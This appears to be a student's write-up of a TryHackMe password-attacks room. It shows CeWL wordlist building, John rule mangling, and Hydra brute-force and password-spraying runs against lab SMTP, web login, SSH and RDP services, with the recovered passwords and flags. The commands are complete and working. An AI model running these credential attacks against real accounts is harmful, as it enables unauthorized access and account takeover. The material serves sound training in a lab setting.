[List.Rules:THM-Password-Attacks]
Az"[0-9][0-9]" ^[!@]


```

```
┌──(kali㉿kali)-[~]
└─$ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                          
┌──(kali㉿kali)-[~]
└─$ ls
armitage-tmp  Documents     multi_launcher  Public       Videos
book.txt      Downloads     Music           stager2.bat
clinic.lst    ftp_flag.txt  payload.hta     Sublist3r
crunch.txt    hashctf2      Pictures        Templates
Desktop       launcher.bat  powercat        thm.hta
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat clinic.lst                                       
protected
Research
Oxytocin
Paracetamol
Cortisol
appointment
Cardiology
February
providing
treatment
commonly
hospital
Template
tooplate
Pregnancy
Saturday
Copyright
Laboratory
Departments
Insurance
healthier
Exercise
customised
Lifestyle
Balanced
nutrition
Benefits
clinical
innovative
technology
experience
multidisciplinary
surgeons
researchers
specialists
together
medicine
pressing
findings
medicines
treatments
President
Weronika
Phillips
released
reaction
connections
stressful
situations
reliever
alleviate
referred
response
APPOINTMENT
Department
Additional
location
affiliated
professionals
establishing
maintaining
qualified
physicians
committed
tailored
specific
requirements
official
Medicalmedical
porttitor
imperdiet
vestibulum
molestie
Phasellus
vulputate
Vestibulum
vehicula
placerat
venenatis
eleifend
Technology
Consultant
thmredteam
Professional
interdum
condimentum
pellentesque
fringilla
volutpat
tincidunt
Maecenas
lobortis
facilisis
pulvinar
dignissim
Suspendisse
Facebook
maecenas
voluptate
Introducing
Categories
pharetra
Curabitur
consequat
ultricies

```

```
┌──(kali㉿kali)-[~]
└─$ john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
4200p 0:00:00:00 100.00% (2022-09-10 15:24) 17500p/s $ultricies9

──(kali㉿kali)-[~]
└─$ cat dict.lst    
!protected00
!Research00
!Oxytocin00
!Paracetamol00
!Cortisol00
!appointment00
!Cardiology00
!February00
!providing00
!treatment00
!commonly00
!hospital00
!Template00
!tooplate00
!Pregnancy00
!Saturday00
!Copyright00
!Laboratory00
!Departments00
!Insurance00
!healthier00
!Exercise00
!customised00
!Lifestyle00
!Balanced00
!nutrition00
!Benefits00
!clinical00
!innovative00
!technology00
!experience00
!multidisciplinary00

.......

┌──(kali㉿kali)-[~]
└─$ hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://10.10.163.182:25 -v
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:01:22
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21000 login tries (l:1/p:21000), ~1313 tries per task
[DATA] attacking smtp://10.10.163.182:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.163.182   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00
[STATUS] attack finished for 10.10.163.182 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:01:45


```


In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.163.182:25 (SMTP).

	What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].
	Use the previously generated John rule from Offline Attacks #2 in your attack! Where [symbol]=[!@]

*!multidisciplinary00*

```
┌──(kali㉿kali)-[~]
└─$ hydra -l phillips -P clinic.lst 10.10.163.182 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:04:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task
[DATA] attacking http-get-form://10.10.163.182:80/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php
[80][http-get-form] host: 10.10.163.182   login: phillips   password: Paracetamol                                                                   
[STATUS] attack finished for 10.10.163.182 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:04:33

```

Perform a brute-forcing attack against the phillips account for the login page at http://10.10.163.182/login-get using hydra? What is the flag?
 use the clinic.lst dictionary to find the password

![[Pasted image 20220910150631.png]]

![[Pasted image 20220910150551.png]]

*THM{33c5d4954da881814420f3ba39772644}*

Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.163.182/login-post/. What is the flag?
Note: use the clinic.lst dictionary in generating and expanding the wordlist!
use John's Single-Extra rule

```
┌──(kali㉿kali)-[~]
└─$ john --wordlist=clinic.lst --rules=Single-Extra --stdout > dict2.lst
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
537026p 0:00:00:00 100.00% (2022-09-10 16:07) 1627Kp/s multidisciplina
                                                                          
┌──(kali㉿kali)-[~]
└─$ hydra -l burgess -P dict2.lst 10.10.163.182 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:08:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 537026 login tries (l:1/p:537026), ~33565 tries per task
[DATA] attacking http-post-form://10.10.163.182:80/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php
[STATUS] 850.00 tries/min, 850 tries in 00:01h, 536176 to do in 10:31h, 16 active
[80][http-post-form] host: 10.10.163.182   login: burgess   password: OxytocinnicotyxO                                                              
[STATUS] attack finished for 10.10.163.182 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:10:26

```

![[Pasted image 20220910151136.png]]

![[Pasted image 20220910151159.png]]

*THM{f8e3750cc0ccbb863f2706a3b2933227}*

### Password spray attack 

This task will teach the fundamentals of a password spraying attack and the tools needed to perform various attack scenarios against common online services.

Password Spraying is an effective technique used to identify valid credentials. Nowadays, password spraying is considered one of the common password attacks for discovering weak passwords. This technique can be used against various online services and authentication systems, such as SSH, SMB, RDP, SMTP, Outlook Web Application, etc. A brute-force attack targets a specific username to try many weak and predictable passwords. While a password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy. The following figure explains the concept of password spraying attacks where the attacker utilizes one common password against multiple users.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/17bdbbc66c5924d99823be70e98832ed.png)

Common weak and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.

    The current season followed by the current year (SeasonYear). For example, Fall2020, Spring2021, etc.
    The current month followed by the current year (MonthYear). For example, November2020, March2021, etc.
    Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.

If a password complexity policy is enforced within the organization, we may need to create a password that includes symbols to fulfill the requirement, such as October2021!, Spring2021!, October2021@, etc. To be successful in the password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses list).

Next, we will apply the password spraying technique using different scenarios against various services, including:

    SSH
    RDP
    Outlook web access (OWA) portal
    SMB

SSH

Assume that we have already enumerated the system and created a valid username list.

```

Hashcat

           
user@THM:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy

        


```

Here we can use hydra to perform the password spraying attack against the SSH service using the Spring2021 password.

```

Hashcat

           
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found

        


```

Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.

RDP

Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as RDPassSpray to password spray against RDP. First, install the tool on your attacking machine by following the installation instructions in the tool’s Github repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:


```

Hashcat

           
user@THM:~# python3 RDPassSpray.py -h
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts

        


```

Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.

```
user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
```

The above output shows that we successfully found valid credentials victim:Spring2021!. Note that we can specify a domain name using the -d option if we are in an Active Directory environment.

```

Hashcat

           
user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt

        


```

There are various tools that perform a spraying password attack against different services, such as:
Outlook web access (OWA) portal

Tools:

    SprayingToolkit (atomizer.py) https://github.com/byt3bl33d3r/SprayingToolkit
    MailSniper
    https://github.com/dafthack/MailSniper


SMB

    Tool: Metasploit (auxiliary/scanner/smb/smb_login)




Use the following username list:


```
Password spraying attack!

           
user@THM:~# cat usernames-list.txt 
admin
phillips
burgess
pittman
guess

        
```

Perform a password spraying attack to get access to the SSH://10.10.163.182 server to read /etc/flag. What is the flag? (season+ year + special character)

```
┌──(kali㉿kali)-[~]
└─$ cat usernames-list.txt 
admin
phillips
burgess
pittman
guess

┌──(kali㉿kali)-[~] (lots of attempts like Autumn2021@, Fall2021! and so on)
└─$ hydra -L usernames-list.txt -p Fall2021@ ssh://10.10.163.182
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:28:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.10.163.182:22/
[22][ssh] host: 10.10.163.182   login: burgess   password: Fall2021@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:28:07

┌──(kali㉿kali)-[~]
└─$ ssh burgess@10.10.163.182      
The authenticity of host '10.10.163.182 (10.10.163.182)' can't be established.
ED25519 key fingerprint is SHA256:VFZHL9xKFvSA3f7JHFbVnOTfVWHDDfOyYBhO7WxW8/I.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.163.182' (ED25519) to the list of known hosts.
burgess@10.10.163.182's password: Fall2021@
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1058-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 10 20:29:14 UTC 2022

  System load:                    0.08
  Usage of /:                     21.1% of 19.32GB
  Memory usage:                   39%
  Swap usage:                     0%
  Processes:                      146
  Users logged in:                0
  IP address for eth0:            10.10.163.182
  IP address for br-c0dd1805e8c7: 172.18.0.1
  IP address for br-mailcow:      172.22.1.1
  IP address for docker0:         172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

61 packages can be updated.
8 updates are security updates.


Last login: Tue Nov 16 09:49:44 2021 from 10.8.232.37
burgess@ip-10-10-163-182:~$ cat /etc/flag
THM{a97a26e86d09388bbea148f4b870277d}
burgess@ip-10-10-163-182:~$ 

```


*THM{a97a26e86d09388bbea148f4b870277d}*

### Summary 



This room introduced the basic concepts of different password attacks and how to create custom and targeted password lists. We covered and discussed various topics, including:

    Default, weak, leaked combined wordlists
    Password profiling
    Offline password attacks
    Online password attacks


Hope you enjoyed the room and keep learning!

[[Weaponization]]